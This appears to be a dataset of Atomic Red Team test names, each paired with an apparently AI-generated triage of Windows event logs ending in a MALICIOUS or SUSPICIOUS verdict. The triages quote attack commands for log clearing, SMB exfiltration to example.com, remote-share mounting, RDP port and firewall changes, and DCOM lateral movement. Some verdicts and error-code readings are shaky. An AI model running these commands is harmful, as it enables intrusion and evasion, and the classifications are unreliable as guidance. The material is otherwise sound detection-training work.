   - A PowerShell command is executed with the following pattern: `powershell.exe & {New-PSDrive -name g -psprovider filesystem -root \\Target\C$}`. Although the action itself could be benign in certain contexts, creating a drive that targets a remote administrative share may indicate unauthorized or suspicious access. Further investigation is warranted to understand the legitimacy of this action.

3. **Wevtutil Executions**:
   - The `wevtutil.exe` utility, which is used to manage event logs, was executed multiple times to clear logs (`cl` command). The usage of `wevtutil.exe` for this purpose suggests intentional log clearing:
     - Cleared logs include Sysmon, Application, and Security logs.

4. **Privileged Logon and Activities**:
   - The user `admin_test` is granted high privileges shortly before logs are cleared (Event ID 4672), having privileges like `SeDebugPrivilege`, `SeSecurityPrivilege`, etc.
   - Logon events (Event ID 4624) show NTLM authentication, associated with network logons, indicating more activity from this user with elevated permissions.

5. **System Process Activity**:
   - Several instances of legitimate Windows processes (e.g., `svchost.exe`, `conhost.exe`, `taskhostw.exe`) and system update activities are logged but do not directly suggest malicious activity. Some update installations for Microsoft Defender are present in the logs, indicating that updates are being applied.

6. **Multiple Credentials Lookup Failures**:
   - The logs for Event ID 5379 show failed retrieval attempts for credentials related to a Microsoft Account. The reason for these failed attempts isn't clarified in the logs but warrants investigation for potential unauthorized access or misconfigurations.

### Assessment

Given the analysis, the presence of deliberate log clearing combined with the execution of PowerShell command targeting a remote share and high-level privilege assignments suggest potentially malicious behavior. The combination of these actions is often associated with malicious intent to gain and maintain unauthorized access while attempting to evade detection.

### Resolution
**MALICIOUS**: The activities outlined, particularly the clearing of logs, use of admin shares, and assignment of high-level privileges, are consistent with malicious intent. Further investigation is warranted to identify the source of the compromise, assess the impact, and take remedial actions to secure the system.

### Recommended Actions
- **Immediate Incident Response**: Secure the machine, conduct a thorough forensic analysis, and disconnect it from the network to prevent further unauthorized access.
- **Review User Activity**: Investigate the actions performed by the `admin_test` account, and verify if they align with expected behavior.
- **Audit Access Controls**: Verify privileged accounts and ensure adherence to least privilege principles.
- **Check for Persistence Mechanisms**: Examine the system for any additional backdoors or unauthorized changes.
- **Harden Logging and Monitoring**: Ensure logs are backed up and monitor for any further log manipulation attempts.
- **Conduct a Security Review**: Evaluate system security controls and policies to prevent future incidents."
Exfiltration Over SMB over QUIC (New-SmbMapping),"### Detailed Analysis of Logs:

#### Suspicious or Anomalous Behavior:

1. **Event Log Clearing**:
   - A series of events where the wevtutil.exe tool was used to clear the Event Logs (""cl"" command) were observed. The logs cleared include Security, System, Application, and Windows PowerShell logs. This activity is documented in multiple logs (Sysmon EventID 1) across `C:\Windows\System32\wevtutil.exe` with various command lines, such as `wevtutil.exe cl Security`.
   - The clearing of logs is associated with the `admin_test` user. This behavior is particularly suspicious as it can indicate an attempt to cover up potentially malicious activities or prevent detection.

2. **PowerShell Activity**:
   - There was a PowerShell execution using `New-SmbMapping` to map a network share from `\\example.com\sales` with `-SkipCertificateCheck` which can be a sign of trying to establish unauthorized or untunneled communications. The presence of `copy 'C:\\path\\to\\file.txt' 'Z:\\'` indicates an attempt to move files, which coupled with other suspicious behavior might be alarming.

3. **System Time Changes**:
   - The System logs show a time change event (EventID 4616) indicating that the system time was adjusted. Despite being a low-level event, time changes can be used by attackers to manipulate log timelines.

4. **Security Log Event (EventID 1102)**:
   - Indicates that the Security log was cleared by process ID `2692`, which matches a cleared log entry associated with `wevtutil`.

#### Indicators of Malicious Activity:

- The use of `wevtutil.exe` to clear logs is highly indicative of malfeasance, as it's a common tactic to cover tracks.
- The initiated PowerShell script appears to be performing network mapping and file transfer with minimal security checks, highlighting potential data exfiltration efforts.

### Assessment of the Situation:

- The sequence of events, particularly the clearing of Event Logs and the suspicious PowerShell activity, are classic indicators of an active threat within the system. The alignment of the process clearing logs and its execution as a high-integrity process by a logged-on user further solidifies the likelihood of compromise.

### Threats or Risks Identified:

- **Data Breach Risk**: The mapped network drive activity via PowerShell suggests possible data exfiltration, especially given the absence of security checks.
- **Security Coverage Evasion**: Log clearing indicates an attempt to evade detection, impeding forensic analysis capabilities.
- **Privileged Account Misuse**: The activity initiated by a high-privilege account (`admin_test`) highlights potential insider threat or credential compromise.

### Guidance on How to Proceed:

1. **Immediate Isolation**:
   - Isolate the affected system to prevent potential data exfiltration or lateral movement across the network.

2. **Forensic Investigation**:
   - Conduct a full forensic analysis of the system. Retrieve deleted logs if possible and further inspect file system changes and network connections made during and after the events.

3. **User Account Review**:
   - Review the recent activity and access logs associated with the `admin_test` account. Evaluate the necessity of account privilege and implement stricter access controls.

4. **Network Monitoring**:
   - Establish network monitoring to identify communications with `example.com` or other unknown external services.

5. **Security Policy Update**:
   - Update security policies to block unauthorized use of tools that can clear logs and limit direct PowerShell usage to essential operations only.

### Resolution:

- **MALICIOUS** - The combination of wevtutil.exe log clearing, suspicious PowerShell usage, and system time manipulation confirms malicious activity and a potential compromise of the system. Immediate response and mitigation actions are recommended to contain the threat."
Copy and Execute File with PsExec,"When examining the provided Windows event logs, several activities and patterns suggest potential suspicious behavior indicating potential malicious actions. Here is a detailed analysis of the logs:

### Analysis:
1. **Log File Clearing:**
   - Multiple events show the clearing of log files by the user `admin_test` on ""SERVER002"". Specifically, system logs, security logs, and PowerShell logs were cleared (EventID 1102). Clearing of logs is a common tactic used by attackers to cover their tracks and evade detection.

2. **Execution of Remote Execution Tools:**
   - There is evidence of PsExec being executed (Process: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PsExec.exe`). PsExec is a well-known tool that can be used for legitimate purposes but is often leveraged by attackers for remote code execution.

3. **Suspicious Process Creation:**
   - Command Prompt (`cmd.exe`) was executed with a suspicious command line involving the execution of PsExec. This type of chaining is commonly observed during privilege escalation or lateral movement attempts.

4. **Use of System Tools in a Suspicious Context:**
   - There are multiple entries related to the use of `wevtutil.exe` for clearing event logs. This tool, like others (e.g., whoami.exe, svchost.exe), is often used by legitimate processes. However, its usage here in the context of other suspicious activities raises concern.

5. **Elevated Privileges:**
   - Privileges such as `SeDebugPrivilege` and `SeLoadDriverPrivilege` were enabled for `admin_test`, which are often targeted for privilege escalation.

6. **Windows Defender and Edge Updates:**
   - Windows Defender's security status was logged, and there were multiple entries related to updates for Microsoft Edge. While updates might be routine, the surrounding context of other suspicious activities necessitates further scrutiny.

### Threat Assessment:
The combination of log clearing, the execution of known administrative tools like PsExec in user suspicious directories, and the suspicious use of system utilities are strong indicators of possible malicious activity.

### Conclusion:
- **Resolution: MALICIOUS**
  - The logs contain definitive indicators of malicious activities, including log tampering, suspicious execution of administrative tools, and attempts to hide these activities by clearing logs.
 
### Guidance on How to Proceed:
1. **Isolate the Affected System:** Immediately isolate the host ""SERVER002"" from the network to prevent further potential compromise.
   
2. **Conduct a Forensic Investigation:**
   - Preserve volatile data and collect forensic images of the system for detailed analysis.
   - Analyze any unauthorize modifications to system files or additional malware on the affected host.

3. **Review User Accounts:**
   - Audit user `admin_test` for any unauthorized activity or privilege escalation.
   - Reset credentials and review user access controls.

4. **Increase Monitoring and Detection:**
   - Implement enhanced monitoring across the network for similar activities.
   - Use IDS/IPS to monitor for signs of lateral movement or persistence mechanisms.

5. **Post-Incident Review:**
   - Conduct a comprehensive incident report to determine the root cause of the compromise.
   - Implement security controls to prevent recurrence, such as user training and stricter access management."
Changing RDP Port to Non Standard Port via Powershell,"Based on the provided logs, a series of suspicious events and potential signs of malicious activity can be observed. Let's analyze the main points:

### Indicators of Malicious Activity:

1. **Clearing Event Logs:**
   - **Security Log (Event ID 1102):** The logs indicate that someone with the username `admin_test` cleared the security logs on Server002. This action, logged under Event ID 1102, is a classic technique that attackers use to cover their tracks after compromising a system.
   
2. **Suspicious PowerShell Command Execution:**
   - **Sysmon (Event ID 1) and PowerShell Logs:** An unusual PowerShell command was executed, which involves setting an RDP port to `4489` and creating a new firewall rule allowing inbound connections on this port. This is indicative of an attempt to enable remote access, usually a malicious activity when performed without authorization.
   - Command: `powershell.exe & {Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value 4489 New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489}`
   
3. **Event Log Clearing Using Wevtutil:**
   - **Sysmon Logs (Event ID 1 & 5):** The logs show multiple instances of `wevtutil.exe` being used to clear event logs (`Microsoft-Windows-Sysmon/Operational`, `System`, `Application`, `Security`, and `Windows PowerShell`). Event Log clearing using `wevtutil` is another potential indicator of malicious activity as it attempts to erase footprints on the host.

4. **Repeated Credential Validation Failures:**
   - **Security Logs (Event ID 5379):** There are repeated failed attempts to retrieve credentials for the target name `MicrosoftAccount:user=02txoixylodcstop`, which could suggest unauthorized access attempts.

### Assessment and Resolution:

The combination of these activities suggests potential malicious behavior. The clearing of logs, especially from the Security channel, combined with unauthorized PowerShell commands attempting to modify RDP settings and firewall rules, points towards an attempt to establish persistent unauthorized access to the system.

### Threats and Risks Identified:

- Unauthorized remote access via modified RDP settings.
- Potential ongoing compromise due to event logs being cleared.
- Possible presence of a backdoor due to unauthorized firewall rule change.

### Guidance:

1. **Immediate Containment:**
   - Disconnect the affected system from the network to prevent further unauthorized access or data exfiltration.

2. **Detailed Investigation:**
   - Collect and analyze additional logs and system artifacts to identify the point of entry and the extent of the compromise.
   - Review user account activities, especially those with elevated privileges.
   
3. **Remediation:**
   - Reset compromised user credentials.
   - Restore event logs from backups if possible for further investigation.
   - Rollback unauthorized configuration changes, especially RDP settings and firewall rules.

4. **Strengthen Security Posture:**
   - Implement stricter logging and monitoring solutions, especially for administrative actions.
   - Use SIEM integration for real-time detection and alerting of suspicious activities.
   - Regularly audit and enforce stricter access controls and user privilege management.

Based on the provided logs and identified indicators, the resolution is determined to be:

**MALICIOUS**"
PDQ Deploy RAT,"Upon reviewing the provided logs, several activities and patterns appear suspicious and possibly indicative of malicious behavior:

1. **Clearing of Logs:**
   - There are multiple events (Event ID 1102 in the Security log and Event ID 104 in the System log) indicating that logs for the Security, System, and Windows PowerShell channels were cleared by the user ""admin_test."" The clearing of logs is a common tactic used by malicious actors to cover their tracks.

2. **PowerShell Activity:**
   - There are multiple PowerShell events. One specific event shows the use of PowerShell to download and install PDQ Deploy (""powershell.exe & {Write-Host Downloading PDQ Deploy installer...""). This can be suspicious if not aligned with normal administrative tasks, especially without prior notice or approval.

3. **Installation of PDQ Deploy:**
   - PDQ Deploy was installed, as seen from the Application log (MsiInstaller Event ID 11707), which confirms the installation was completed successfully. However, the process leading to its installation might not have been approved.

4. **Use of ""wevtutil"":**
   - The Sysmon log shows multiple instances of the ""Eventing Command Line Utility"" (wevtutil.exe), used to clear event logs (Event ID 5 and 1). This ties back to the journal clearing events and suggests potential attempts to hide activities.

5. **Unusual Command Execution:**
   - The use of ""cmd.exe"" with command-line execution involving PDQ Deploy (Event ID 1 in Sysmon log) is also seen, which appears to relate to the automated installation or configuration script.

6. **Privilege Level and User:**
   - Many actions were performed by the user ""SERVER002\\admin_test"" with a high integrity level, which suggests administrative privileges. If ""admin_test"" is not a recognized legitimate administrative account or this activity is unauthorized, it is a significant concern.

**Assessment:**
The combination of log clearing, unsanctioned use of PowerShell scripts, downloading and installing software, and executing commands via cmd.exe under an admin account strongly points to suspicious, if not potentially malicious, activity. The series of actions appears designed to execute unauthorized installations while attempting to obfuscate the trail through log clearance.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Validate User Activity:**
   - Investigate whether the ""admin_test"" account is legitimate and if these activities were authorized. If unauthorized, it may indicate compromised credentials.

2. **Investigate the Software Deployment:**
   - Verify whether the PDQ Deploy installation was authorized and assess the impact or changes it made to the system.

3. **Review Security Policies:**
   - Ensure tighter control and auditing over administrative accounts and the use of potentially dangerous utilities like PowerShell and ""wevtutil.""

4. **Log Monitoring and Alerts:**
   - Set up alerts for similar activities, especially clearing of logs, which should be investigated immediately when they occur.

5. **DFIR Response:**
   - If unauthorized access or malicious activity is confirmed, engage Digital Forensics and Incident Response (DFIR) teams to handle evidence collection, remediation, and mitigation of further risks."
Deploy 7-Zip Using Chocolatey,"Based on the analysis of the provided Windows event logs, here is a detailed assessment:

1. **Suspicious Behavior:**
   - The logs indicate that the `wevtutil.exe` command was executed several times to clear various event logs (`Application`, `System`, `Security`, and `Windows PowerShell`). This action is flagged as suspicious because clearing event logs is a common tactic used to remove traces of malicious activity.
   - The `Security` log entry with `EventID 1102` explicitly shows that the security log was cleared by the user `admin_test`.
   - PowerShell script usage (`choco install -y 7zip`) is observed in the logs. While the installation of 7-Zip using Chocolatey is not inherently malicious, PowerShell scripting activity can sometimes be used for executing unwanted or malicious scripts, especially without proper context.
   - Multiple processes and instances of `conhost.exe` associated with `wevtutil.exe` indicate these logs might have been cleared during a session initiated by `admin_test`.
   - Most activities related to Microsoft Edge Update processes appear benign; however, the simultaneous clearing of event logs after the execution of these processes could indicate the attempts to cover tracks after potentially unwanted changes.

2. **Anomalous Behavior:**
   - The processes related to `MicrosoftEdgeUpdate.exe` and associated registrations (COM registration helpers) executed under `NT AUTHORITY\SYSTEM` appear typical for software update operations, especially for legitimate software. The presence of these in `Program Files (x86)` suggests regular updates.
   - The presence of commands run at a high integrity level by the user `admin_test` with administrative privileges raises concerns about privilege abuse if this user is compromised or acting maliciously.

3. **Guidance and Resolution:**
   - **Resolution**: **MALICIOUS** - The events related to the clearing of the logs (especially the Security log) without an administrative task justification strongly indicate an attempt to hide malicious activity.
   - **Threats/Risks Identified**: Potential compromise of the `admin_test` account, possible malicious activities being covered up by log clearing, and misuse of PowerShell.
   - **Next Steps**:
     - Immediately audit `admin_test` account activities and credentials.
     - Check system integrity and look for any unauthorized changes or suspicious files.
     - Engage in a full forensic analysis to identify any residual threats or unauthorized access.
     - Apply stricter monitoring and audit logs for similar patterns on other systems.
     - Consider reimaging the affected system to ensure full removal of any hidden threats or unauthorized modifications.

The indicators and patterns present in the logs are strongly suggestive of a compromise scenario, and further investigation and remediation actions are crucial."
Changing RDP Port to Non Standard Port via Command_Prompt,"Upon analysis of the provided logs, several actions and behaviors stand out that warrant further investigation.

### Detailed Analysis:

1. **Log File Clearing Events (Event ID 1102 & 104):**
   - Multiple instances of event log clearing are recorded:
     - Security log cleared (`EventID: 1102`, Security log).
     - System and Windows PowerShell logs cleared (`EventID: 104`, System log).
   - The user responsible for these actions is `admin_test`, indicating someone with administrative privileges is attempting to obscure activity on the system.

2. **Privileged Account Activity (Event ID 4672):**
   - High privileges were granted to the `admin_test` account, which includes `SeDebugPrivilege` and other elevated permissions typically associated with administrative activities. This laid the ground for potential malicious actions.

3. **System Time Change (Event ID 4616):**
   - The system time was altered, which can be a tactic used to manipulate log entries or avoid detection based on time-based detection mechanisms.

4. **Command Execution and Further Manipulation (Sysmon Events):**
   - Execution of suspicious commands observed:
     - `cmd.exe` process executed a command to change RDP (Remote Desktop Protocol) port via the registry and adjust firewall rules (`ProcessId: 6112`), which could be indicative of attempts to maintain unauthorized access.
     - Processes `reg.exe` and `netsh.exe` were used subsequently to implement these changes, seen in Sysmon EventID 1, suggesting an effort to modify the system's behavior without legitimate cause.
   
5. **Widespread Process Execution (Sysmon Events):**
   - Numerous executions of `wevtutil.exe` for clearing various logs, all linked back to the `admin_test` user. This reiterates log tampering and attempts to hide actions performed.
   
6. **Failed Access Attempt (Event ID 5379):**
   - There are several failed credential reading attempts indicating potentially unauthorized attempts to access credentials linked to certain services.

### Assessment of Situation:

The collected evidence strongly suggests a **compromise** of the system:
- The sequence of log clearances, combined with system manipulation through privilege escalation and system adjustments (e.g., RDP configuration), strongly points to an attempted cover-up of unauthorized activities.
- The system time adjustment reinforces this narrative, as it is often a tactic used to align logs for disguise or deception reasons.

### Recommendation:

Based on supporting evidence, this situation should be classified as **MALICIOUS**. Here are suggested actions:

- **Immediate Response:**
  - Block and isolate the affected system (Server002) from the network to prevent potential lateral movement.
  - Revoke administrative privileges of the user account `admin_test` and assess if credentials were compromised.
  - Conduct a digital forensic investigation to trace the origin of unauthorized access.

- **Remediation Steps:**
  - Review and reset all administrative accounts.
  - Apply any missing critical security patches.
  - Reinforce monitoring around RDP and other remote access services.
  
- **Preventive Measures:**
  - Implement stricter access controls and privileged access management across systems.
  - Consider deploying more robust logging and alerting mechanisms, ensuring logs are difficult to alter or delete without being detected. 

This assessment underscores the significance of maintaining comprehensive audit trails and rigorous security protocols in safeguarding critical systems."
RDP to DomainController,"Upon reviewing the provided Windows event logs, several indicators suggest potential malicious activity or at least suspicious behavior that warrants further investigation. Here are the observations:

1. **Event Log Clearing**:
   - **Security Event ID 1102**: The security event log was cleared by the user ""admin_test"" on the computer ""Server002"". This is a standard tactic used by attackers to cover their tracks. Legitimate users typically do not have a reason to clear security logs.

2. **Process Execution and Command-Line Arguments**:
   - **Sysmon Event ID 1** (Process Creation for `wevtutil.exe`): This utility is used to manage and clear event logs. It was executed multiple times by the user ""admin_test"" to clear logs related to various event channels (Sysmon, System, and Security). The command ""wevtutil.exe cl"" suggests log file clearance, which is aligned with an attempt to remove traces of activity.
   - **Sysmon Event ID 1** (Powershell Execution): The command line arguments contain a clear text password `\""1password2!\""`, which is highly unusual and indicative of poor security practices, potentially facilitating unauthorized access.

3. **Privilege Escalation**:
   - **Security Event ID 4672**: A special privileges logon session associated with the ""SYSTEM"" user, which includes privileges often targeted by attackers (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege).

4. **Credential Access and Network Connection Attempts**:
   - **Sysmon Event ID 1** (Process Creation for `cmdkey.exe` and `mstsc.exe`): Shows a PowerShell script attempting to establish an RDP connection using stored credentials, which can suggest unauthorized remote access attempts, especially from an unusual execution context or user.

5. **Credential Attempt and Network Logon**:
   - Multiple **Security Event ID 5379** logs denote numerous unsuccessful attempts to retrieve Microsoft account credentials, evident from the return code `3221226021` (often translates to STATUS_LOGON_FAILURE).

6. **Lack of Log Entries in Application Logs**:
   - The absence of application log entries following the clearing of logs should be a red flag, indicating possible deletion.

**Assessment**:
- The logs suggest a strong possibility of malicious behavior, specifically attempts to obfuscate actions (log clearance), potential credential abuse (plain text passwords, unsuccessful Microsoft account credential reads), and suspicious pattern executions (remote desktop access via PowerShell and cmdkey). These series of actions align well with tactics used during lateral movement and persistence phases of an attack.

**Guidance**:
- Immediate deep-dive investigation into recent activities on the CEO's machine and server (Server002).
- Audit all privileged accounts, especially ""admin_test"", and reset the passwords.
- Enforce stricter PowerShell execution policies and deploy enhanced logging to detect any further suspicious activities.
- Review and enhance security configurations, especially around log retention and visibility for critical systems.
- Conduct a thorough review of active directory logs for any similar patterns of anomalous account behavior.

**Resolution**: **MALICIOUS**

The activities observed in the logs represent clear signs of potential compromise, specifically targeted at evading detection, securing access through credentials, and possibly lateral movement within the network. Immediate action is recommended to mitigate any further damage and secure the environment."
PowerShell Lateral Movement Using Excel Application Object,"Based on the analysis of the provided event logs, there are several indicators of potentially malicious activity. Let's break down the key points:

1. **Log Cleared Events:**
   - There are multiple log-clearing events (`EventID: 104` in System log and `EventID: 1102` in Security log) by the user `admin_test`. The `wevtutil.exe` was used to clear the logs, evident from Sysmon logs. Clearing logs is often a tactic used by attackers to cover their tracks.

2. **Suspicious PowerShell Activity:**
   - The PowerShell log shows a suspicious execution with the command line: `powershell.exe & {copy c:\\windows\\system32\\calc.exe 'C:\\users\\admin\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe' $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost"")) $com.ActivateMicrosoftApp(""5"")}`. This includes copying the `calc.exe` to a user directory with an unusual name `foxprow.exe`, which could potentially be an attempt to mask the `calc.exe` as another application or script.

3. **Process Execution and Use of `wevtutil.exe`:**
   - The `wevtutil.exe` was used multiple times with the `cl` (clear) command on different logs: `System`, `Application`, and `Security`. This activity was executed under a high integrity level, suggesting admin privileges were used.

4. **Additional Anomalies:**
   - There is an error related to the CopyItem operation in PowerShell, indicating that the copying of `calc.exe` did not entirely succeed due to path issues. However, the intent behind this command remains suspicious.

5. **Overall Context:**
   - The combination of the log clearing, the unusual PowerShell script execution with potential file masquerading, and the use of high-privilege process execution (`wevtutil.exe` clearing logs) are strong indicators of malicious activity.

**Assessment & Recommendation:**
- **Resolution: MALICIOUS**
  - The series of events strongly suggests an attempt to conduct malicious operations, likely aiming to cover up the activities by clearing logs and using PowerShell for potentially nefarious task automation or persistence.
  
- **Actions to Take:**
   - Immediately isolate the affected machine to prevent further spread or data exfiltration.
   - Conduct a deeper forensic analysis to understand the full scope of compromise, including all processes executed by the `admin_test` account.
   - Review user account activities and consider revoking or rotating credentials if necessary.
   - Strengthen monitoring to detect similar suspicious activities in the future and enhance security controls around log management and PowerShell execution.

These steps are crucial in mitigating the threat and preventing future incidents."
